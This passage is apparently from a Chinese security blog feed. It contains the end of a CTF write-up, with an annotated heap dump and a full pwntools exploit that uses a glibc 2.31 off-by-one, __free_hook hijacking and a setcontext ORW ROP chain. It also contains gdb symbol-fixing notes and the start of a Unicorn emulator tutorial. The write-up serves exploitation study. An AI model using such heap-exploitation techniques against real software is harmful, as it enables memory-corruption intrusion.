class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0x55fb03c8db90:0x00000000000000000x00000000000000c1</span><br><span class="line">0x55fb03c8dba0:0x00007f0b8b87ab720x000055fb03c8dd50/* ORW_ROP链</span><br><span class="line">0x55fb03c8dbb0:0x00007f0b8b87d04f0x0000000000000000</span><br><span class="line">0x55fb03c8dbc0:0x00007f0b8b89e4000x0000000000000002</span><br><span class="line">0x55fb03c8dbd0:0x00007f0b8b9650000x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dbe0:0x00000000000000030x00007f0b8b87d04f</span><br><span class="line">0x55fb03c8dbf0:0x000055fb03c8dd500x00007f0b8b970241</span><br><span class="line">0x55fb03c8dc00:0x00000000000000200x0000000000000000</span><br><span class="line">0x55fb03c8dc10:0x00007f0b8b964ff00x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dc20:0x00000000000000010x00007f0b8b965090</span><br><span class="line">0x55fb03c8dc30:0x00000000000000000x0000000000000000</span><br><span class="line">0x55fb03c8dc40:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x55fb03c8dc50:0x00000000000000000x00000000000000c1/* 需要释放的堆块</span><br><span class="line">0x55fb03c8dc60:0x000055fb03c8dc600x000055fb03c8dc60/* mov rdx, [rdi+8]</span><br><span class="line">0x55fb03c8dc70:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dc80:0x00007f0b8b8abf8d0x6161616161616161/* call qword ptr [rdx+20h]</span><br><span class="line">0x55fb03c8dc90:0x61616161616161610x6161616161616161&lt;=&gt; call &lt;setcontext+53&gt;</span><br><span class="line">0x55fb03c8dca0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcb0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcc0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcd0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dce0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcf0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dd00:0x000055fb03c8dba00x00007f0b8b879679</span><br><span class="line">/* mov rsp, QWORD PTR [rdx+0xa0] &lt;=&gt; mov rsp, [ORW_ROP链]</span><br><span class="line">/* mov rcx, [rdx+0A8h] &lt;=&gt; mov rcx, [ret]</span><br><span class="line">/* push rcx</span><br><span class="line">/* ret &lt;=&gt; ret [rcx]</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./orz&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note size : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input your note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input new note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># fill up 0xc1 tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># off-by-one to leak libc_base </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0-5</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;\xc1&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base====&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overlapping to leak heap_base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#6-8 &lt;==&gt;2-4</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    heap_base=u64(io.recv(<span class="number">8</span>))&amp;<span class="number">0xfffffffff000</span>-<span class="number">0x2000</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># hijack __free_hook</span></span><br><span class="line">    edit(<span class="number">7</span>,p64(free_hook)+<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;heap_base====&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    magic=libc_base+<span class="number">0x1518B0</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>,p64(magic))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gadgets</span></span><br><span class="line">    pop_rax_ret=libc_base+<span class="number">0x0000000000047400</span></span><br><span class="line">    pop_rdi_ret=libc_base+<span class="number">0x0000000000023b72</span></span><br><span class="line">    pop_rsi_ret=libc_base+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12_ret=libc_base+<span class="number">0x0000000000119241</span></span><br><span class="line">    ret=libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">    syscall=libc_base+<span class="number">0x0000000000010E000</span></span><br><span class="line"></span><br><span class="line">    flag_addr=heap_base+<span class="number">0xd50</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    orw_rop=p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">    orw_rop+=p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">    orw_rop+=p64(pop_rdx_r12_ret)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    rop_addr=heap_base+<span class="number">0xba0</span></span><br><span class="line">    jmp_addr=heap_base+<span class="number">0xc60</span></span><br><span class="line">    setcontext=libc_base+<span class="number">0x54f8d</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct heap &amp; trigger __free_hook</span></span><br><span class="line">    add(<span class="number">0xb0</span>,p64(jmp_addr)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(setcontext)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>+p64(rop_addr)+p64(ret))<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0xb0</span>,orw_rop)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="其他：patchelf后修复gdb的debug符号表"><a href="#其他：patchelf后修复gdb的debug符号表" class="headerlink" title="其他：patchelf后修复gdb的debug符号表"></a>其他：patchelf后修复gdb的debug符号表</h3><p><code>patchelf</code>修改了<code>libc</code>和<code>ld</code>，而<code>gdb</code>调试时会去寻找<code>libc</code>目录下的<code>.debug</code>文件，所以无法使用一些<code>heap/bins</code>之类的命令，因此我们去<code>glibc-all-in-one</code>中下载对应版本的<code>libc</code>及其附带的<code>.debug</code>。</p><p>实现操作如下：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>在该目录下<code>ctrl+h</code>便能显示出隐藏文件<code>.debug</code>，将<code>.debug</code>复制到题目的目录下，<code>gdb</code>调试命令就恢复了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote><p><a href="https://verf1sh.github.io/2022/05/25/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#midpwn">第二届广东大学生网络安全大赛-by Verfish</a></p><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">关于不同版本 glibc 更换的一些问题</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;赛前复盘一道&lt;code&gt;libc2.31&lt;/code&gt;的&lt;code&gt;off-by-one&lt;/code&gt;漏洞利用的题目。&lt;/p&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="libc-2.31" scheme="http://example.com/tags/libc-2-31/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="http://example.com/2022/06/24/unicorn/"/>
    <id>http://example.com/2022/06/24/unicorn/</id>
    <published>2022-06-24T02:46:31.000Z</published>
    <updated>2023-02-06T11:17:54.969Z</updated>
    
    <content type="html"><![CDATA[<p>结合 ctf赛题 学习一下 unicorn 引擎的基础使用。</p><p><a href="https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1">参考文章</a></p><p><a href="https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md">unicorn中文文档</a></p><span id="more"></span><h2 id="hxp-CTF-2017-Fibonacci"><a href="#hxp-CTF-2017-Fibonacci" class="headerlink" title="hxp CTF 2017 Fibonacci"></a>hxp CTF 2017 Fibonacci</h2><p>运行该二进制程序时，我们发现打印<code>flag</code>的速度越来越慢：</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/177336/3/25517/8754/62b52868E53cee082/a11a2873758db905.png" alt="1656039526862.png"></p><p>因此必须对该程序进行优化，在合理时间内打印出<code>flag</code></p><p>利用<code>ida_pro</code>反编译看一下程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// r9</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">7</span>]; <span class="comment">// [rsp+Ch] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;unk_4007E1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v5) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      FIB(v4 + v5, v10);<span class="comment">//调用 FIB 函数</span></span><br><span class="line">      v8 = v7;</span><br><span class="line">      v5 = v7 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">8</span> );</span><br><span class="line">    v4 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (v10[<span class="number">0</span>] &lt;&lt; v8) == v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">    _IO_putc(v6 ^ (LOBYTE(v10[<span class="number">0</span>]) &lt;&lt; v8), <span class="built_in">stdout</span>);<span class="comment">//打印 flag 字符</span></span><br><span class="line">  &#125;</span><br><span class="line">  _IO_putc(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看一下<code>FIB</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">FIB</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = FIB(<span class="number">0LL</span>, a2);<span class="comment">// 出口</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = FIB((a1 - <span class="number">2</span>), a2);<span class="comment">// 递归调用 FIB</span></span><br><span class="line">      result = v3 + FIB((a1 - <span class="number">1</span>), a2);<span class="comment">// 递归调用 FIB</span></span><br><span class="line">    &#125;</span><br><span class="line">    v5 = ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    v6 = v5</span><br><span class="line">       + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)</span><br><span class="line">       + ((v5 + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    *a2 ^= ((BYTE1(v6) &amp; <span class="number">0xF</span>) + (v6 &amp; <span class="number">0xF</span>) + ((((v6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF0F0F</span>) + (v6 &amp; <span class="number">0xF0F0F0F</span>)) &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a2 ^= <span class="number">1u</span>;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到程序在不断递归调用<code>FIB</code>，而递归函数的缺点显而易见：</p><ol><li><p>递归由于是函数调用自身，而<strong>函数调用是有时间和空间的消耗</strong>的：每一次函数调用，都需要在内存栈中分配空间以保存参数、返回地址以及临时变量，而<strong>往栈中压入数据和弹出数据都需要时间</strong>。-&gt;效率</p></li><li><p>递归中很多计算都是重复的，由于其本质是把一个问题分解成两个或者多个小问题，<strong>多个小问题存在相互重叠的部分</strong>，则存在重复计算，如<code>fibonacci斐波那契数列</code>的递归实现。-&gt;效率</p></li></ol><p>因此需要考虑优化问题，若选择重构代码则太过复杂，且易产生<code>bug</code>，而使用<code>unicorn</code>就能很好地避免这个问题。</p><h3 id="1-利用unicorn运行目标程序"><a href="#1-利用unicorn运行目标程序" class="headerlink" title="1. 利用unicorn运行目标程序"></a>1. 利用unicorn运行目标程序</h3><p>首先先将需要的库导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *<span class="comment"># 导入unicorn库</span></span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *<span class="comment"># 因为程序是x86架构的，故导入x86的常量</span></span><br><span class="line"><span class="keyword">import</span> struct<span class="comment"># 用于打包数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):<span class="comment"># 读取目标文件的数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:<span class="comment"># 以二进制格式打开一个文件用于只读</span></span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">data</span>):<span class="comment"># 解包数据</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):<span class="comment"># 打包数据</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br></pre></td></tr></table></figure><p>记住<code>python3</code>下二进制文件的打开形式为<strong>‘rb’</strong>，否则会报如下错误：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0x90 in position 24: invalid start byte</span></span><br></pre></td></tr></table></figure><p>首先实例化一个基于<code>X86</code>架构的模式为<code>64位</code>的模拟器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)<span class="comment"># 其他架构和模式详见文档</span></span><br></pre></td></tr></table></figure><p>接着开辟两段空间，一段用于储存程序代码，另一段用于模拟栈，申请大小均为1024<em>1024(即*<em>1MB</em></em>)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prog_base = <span class="number">0x400000</span><span class="comment"># 初始空间地址</span></span><br><span class="line">prog_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># 空间大小</span></span><br><span class="line">stack_base = <span class="number">0x0</span><span class="comment"># 初试栈地址</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># 栈大小</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, prog_size)<span class="comment"># 申请(映射) 1MB 内存用于存放程序</span></span><br><span class="line">mu.mem_map(stack_base, stack_size)<span class="comment"># 申请(映射) 1MB 内存用于存放栈</span></span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, 